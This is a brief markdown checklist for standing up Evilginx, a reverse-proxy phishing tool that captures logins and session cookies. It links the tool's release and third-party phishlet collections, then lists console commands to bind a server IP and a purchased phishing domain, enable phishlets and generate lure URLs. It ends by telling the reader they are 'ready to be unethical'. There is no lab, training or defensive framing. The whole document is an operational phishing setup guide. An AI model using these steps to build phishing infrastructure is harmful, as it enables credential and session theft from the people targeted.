## Evilginx Checklist
For evilginx its pretty straightforward 😊

- **Choose Your Platform**
  - [ ] Linux (Preferred)
  - [ ] Windows (Optional)
      
-  Get the **Evilginx Build** [Link]( https://github.com/kgretzky/evilginx2/releases/tag/v3.3.0)
-  **Phishlet** (Nahh I'm not gonna show here step by step guide how to make if you want to learn that go *[here](https://help.evilginx.com/docs/guides/phishlets)* or else *[Phishlets](https://github.com/An0nUD4Y/Evilginx2-Phishlets)*)
-  **Configuration**
  - [ ] Configure Evilginx with IP and Domain
       ```bash
        config ipv4 <evilginx EC2 instance IP>
        config domain <purchased phishing domain (GoDaddy, Namecheap, etc.)>

  - [ ] Set up and enable phishlets
       ```bash
        phishlets hostname <phishlet name> <Phishing Domain>
        phishlets enable <phishlet name>

  - [ ] Creating Lures
       ```bash
       lures create <phishlet name>
       lures
       lures get-url <id no.>


*This is all, you are ready to be unethical on your own risk*
